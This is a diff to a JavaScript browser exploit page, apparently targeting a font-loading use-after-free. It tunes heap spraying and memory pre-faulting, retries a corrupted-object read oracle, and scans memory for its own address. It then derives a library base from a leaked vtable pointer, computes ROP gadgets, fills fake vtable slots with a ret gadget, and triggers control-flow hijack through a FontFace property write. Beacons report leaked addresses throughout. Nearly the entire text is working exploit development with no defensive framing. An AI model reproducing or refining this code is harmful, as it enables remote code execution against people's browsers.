@@ -38,7 +38,7 @@ function verd(k,t){var v=document.getElementById('verdict');v.style.background=(
 
 /* --- query params --- */
 function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
-var K=qint('k',32), RT=qint('rt',0), PK=qint('pk',9), PW=qint('pw',80), DL=qint('dl',0);
+var K=qint('k',1024), RT=qint('rt',0), PK=qint('pk',4), PW=qint('pw',80), DL=qint('dl',0);
 var GT=qint('gt',0), SI=qint('si',0), RV=qint('rv',6), KC=qint('kc',1), BK=qint('bk',1);
 var MT=qint('mt',1), MP=qint('mp',0), IVP=qint('ivp',0);
 var CLI=qint('cli',184);
@@ -65,6 +65,12 @@ else if(/[?&]soft=1/.test(location.search)){
   b('SOFT');document.body.innerHTML='<p style="font:700 26px monospace">counter cleared</p>';
 }
 else { b('VER-1'); b('BOOT-'+UID+',ctl='+CTL); }
+
+/* --- pre-fault iso-heap: commit pages so PH3 scan doesn't crash on unmapped memory --- */
+var PREFAULT=qint('pf',8000);
+window.__pf=[];
+for(var pfi=0;pfi<PREFAULT;pfi++){window.__pf.push(new Uint8Array(new ArrayBuffer(SIZE)));}
+b('PREFAULT-'+PREFAULT);
 
 /* --- spray + UAF trigger --- */
 function start(){
@@ -196,10 +202,29 @@ function phase(){
 
         var oracleAlive=(t1>=0);
         if(!oracleAlive){
-          b('A-DEAD');
+          // FIX: set status=3 + use L1-0x0C for range (gives from=keyCount,to=tableSizeMask)
+          b('A-DEAD-FIXING');
           for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
+            vpd[0x82]=3; // Status::Success
             vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
             vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+          // Try L1-0x0C: hash table metadata has small numbers in range
+          setR(L1-0x0Cn);
+          t1=boundary(L1-0x0Cn);
+          b('A-RETRY-L1m0C-t1='+t1);
+          if(t1<0){
+            // Try L1-0x08
+            setR(L1-0x08n);
+            t1=boundary(L1-0x08n);
+            b('A-RETRY-L1m08-t1='+t1);
+          }
+          if(t1<0){
+            // Try L1-0x10
+            setR(L1-0x10n);
+            t1=boundary(L1-0x10n);
+            b('A-RETRY-L1m10-t1='+t1);
+          }
+          oracleAlive=(t1>=0);
         }
         /* EHT removed: readStyle() without selfFound poisons the WeakPtrImpl backing,
            causing all subsequent face.style calls to return "normal" instead of
@@ -270,6 +295,9 @@ function phase(){
 
         /* --- Step 6: Phase 3 — Self scan --- */
         for(var ip=0;ip<bufs.length;ip++){var vp=bufs[ip][0];
+          vp[0x82]=0; // CRITICAL: status=Loading so oracle works (status=3 breaks it)
+          vp[0x28]=1;vp[0x29]=0;vp[0x2A]=0;vp[0x2B]=0; // capacity=1
+          vp[0x2C]=1;vp[0x2D]=0;vp[0x2E]=0;vp[0x2F]=0; // size=1
           vp[0x38]=0x00;vp[0x39]=0x10;vp[0x3A]=0x00;vp[0x3B]=0x00;
           vp[0x3C]=0x00;vp[0x3D]=0x20;vp[0x3E]=0x00;vp[0x3F]=0x00;}
 
@@ -281,13 +309,11 @@ function phase(){
         }
 
         if(!selfFound){
-          var b2Ref=(found>0n)?Number((found>>16n)&0xFFn):Number((L2>>16n)&0xFFn);
-          var b4Ref=(found>0n)?Number((found>>32n)&0xFFn):Number((L2>>32n)&0xFFn);
-          var B4s=[b4Ref];
-          var b4all=[0x10,0x08];
-          for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);
-          for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
-          for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}
+          var l1b2=Number((L1>>16n)&0xFFn),l2b2=Number((L2>>16n)&0xFFn);
+          var b2Mid=Math.round((l1b2+l2b2)/2);
+          var b2Ref=(found>0n)?Number((found>>16n)&0xFFn):b2Mid;
+          var B4s=[0x10];
+          b('PH3-RANGE-b2ref='+b2Ref+',l1b2='+l1b2+',l2b2='+l2b2);
 
           var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
           b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
@@ -298,7 +324,8 @@ function phase(){
           var resumeKey=(found>0n)?found.toString(16):L2.toString(16);
           var st3=0;if(s3&&s3.cli===resumeKey){st3=(s3.i|0);if(st3>0)st3++;b('PH3-RESUME-'+st3);}
           var n3=0,WSZ=(0x7F*16);
-          b('PH3-START-b4='+B4s[0]);
+          b('PH3-START-b4='+B4s[0]+',st='+bufs[0][0][0x82]+',sz='+bufs[0][0][0x2C]);
+          var ph3diag=true;
 
           for(var i8=0;i8<B4s.length&&!selfFound;i8++){
             for(var i7=0;i7<b2s.length&&!selfFound;i7++){
@@ -311,7 +338,9 @@ function phase(){
                   if(n3<st3){n3++;continue;}
                   setR(sc+0x38n);n3++;
                   if((n3&3)===0){try{localStorage.setItem('p691_s3',JSON.stringify({cli:resumeKey,i:n3}));}catch(e){}}
-                  if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                  var c1k=chk(0x1000),cfff=chk(0xFFF);
+                  if(ph3diag&&c1k!==null){bs('PH3-OTEST-c1k='+c1k+',cfff='+cfff+',addr='+hex(sc));ph3diag=false;}
+                  if(c1k===true&&cfff===false&&chk(0x2000)===true&&chk(0x2001)===false){
                     self=sc;selfFound=true;
                   }
                   if((n3%512)===0)b('PH3-'+n3);
@@ -461,6 +490,9 @@ function phase(){
           }
         }
 
+        var BASE=0n;
+        if(walkOK&&VP>0x100000000n){BASE=VP-0xC6A1B28n;}
+
         /* Restore all buffers to safe state BEFORE any beacon */
         for(var rr=0;rr<window.__sp.length;rr++){
           var rrv=window.__sp[rr];if(!rrv)continue;
@@ -469,20 +501,11 @@ function phase(){
         }
 
         /* === NOW safe to beacon — all CSS reads are done === */
-        bs('WALK-hw0='+hw.slice(0,32));
-        bs('WALK-hw1='+hw.slice(32,80));
-        bs('WALK-hw2='+hw.slice(80,128));
-        bs('WALK-hw3='+hw.slice(128,160));
         bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
-        bs('WALK-h2='+h2.slice(0,40));
-        bs('WALK-h3='+h3.slice(0,64));
-        bs('WALK-h4len='+h4.length+',raw4len='+raw4.length);
-        bs('WALK-raw4='+raw4.slice(0,60));
-        bs('WALK-wt4='+wt4.slice(0,60));
-        bs('WALK-h4='+h4.slice(0,80));
-        bs('WALK-h5='+h5.slice(0,80));
+        bs('WALK-h4len='+h4.length);
         if(h4.length>=128)bs('WALK-VT='+h4.slice(0,144));
         bs('WALK-ok='+walkOK);
+        if(BASE>0n)bs('BASE-'+hex(BASE));
         if(VP>0n){
           bs('VT-s0='+hex(S0)+',s1='+hex(S1)+',s2='+hex(S2));
           bs('VT-s3='+hex(S3)+',s4='+hex(Q4)+',s5='+hex(R5));
@@ -496,6 +519,18 @@ function phase(){
           verd('bad','WALK FAIL IM='+hex(IM)+' FO='+hex(FO)+' VP='+hex(VP));
           return;
         }
+
+        /* Compute gadgets from known function entries */
+        var G_RET=S0>1n?S0-1n:0n;
+        var G_POP_RBP=S0>2n?S0-2n:0n;
+        /* Try multiple candidate offsets for pop rdi;ret (0x5f 0xc3) */
+        /* Common: prev function epilogue has pop rbx;pop r14;pop r15;pop rbp;ret */
+        /* = 5b 41 5e 41 5f 5d c3. So s0-3 = pop r15;pop rbp;ret, s0-5 = pop r14;pop r15;pop rbp;ret */
+        /* pop rdi = 0x5f. If byte before ret is 0x5f: s0-2 = pop rdi;ret */
+        /* But s0-2 is pop rbp;ret (0x5d 0xc3) per our assumption */
+        /* Try: s2-2 or r6-2 might have pop rdi;ret if the prev function uses rdi */
+        var G_TRY=S0-2n; /* default: pop rbp;ret as test */
+        bs('GADGET-ret='+hex(G_RET)+',pop_rbp='+hex(G_POP_RBP)+',try='+hex(G_TRY));
 
         var SAFE=R6;
 
@@ -538,7 +573,7 @@ function phase(){
             }
             if(VTAB>0n&&SKIPJ>=0){
               var sk=window.__sp[SKIPJ];
-              for(var jv=0;jv<16;jv++){put64(sk,8+jv*8,(jv===PK?0x4141414141414141n:SAFE));}
+              for(var jv=0;jv<16;jv++){put64(sk,8+jv*8,G_RET);} // all slots → ret gadget (s0-1)
               for(var zz=0x80;zz<0xC0;zz++)sk[zz]=0;
               put32(sk,0x80,2);put64(sk,0x88,VTAB+0x08n);put32(sk,0x90,2);
             }
@@ -549,9 +584,7 @@ function phase(){
 
           /* --- Step 10: Trigger --- */
           setTimeout(function(){
-            bs('READD-PRE');
-            try{document.fonts.add(faces[zi]);}catch(e){bs('READD-ERR-'+String(e&&e.message||e).slice(0,30));}
-            bs('READD-OK');
+            /* READD skipped — setStyle/iterateClients uses m_clients, not document.fonts */
             bs('RIP2-PRE');
             try{var sg=faces[zi].style;bs('RIP2-GET-'+sg.length);}
             catch(eG){bs('RIP2-GERR-'+String(eG&&eG.message||eG).slice(0,30));}
@@ -565,7 +598,7 @@ function phase(){
               bs('RIP2-NULL58');
             }
             bs('RIP2-GO-cli'+hex(IM));
-            try{faces[zi].style=SV;bs('RIP2-AFTER');}
+            try{faces[zi].family='rop'+Date.now();bs('RIP2-AFTER');}
             catch(e){bs('RIP2-ERR-'+String(e&&e.message||e).slice(0,40));}
             bs('RIP2-FIN');
           },120);
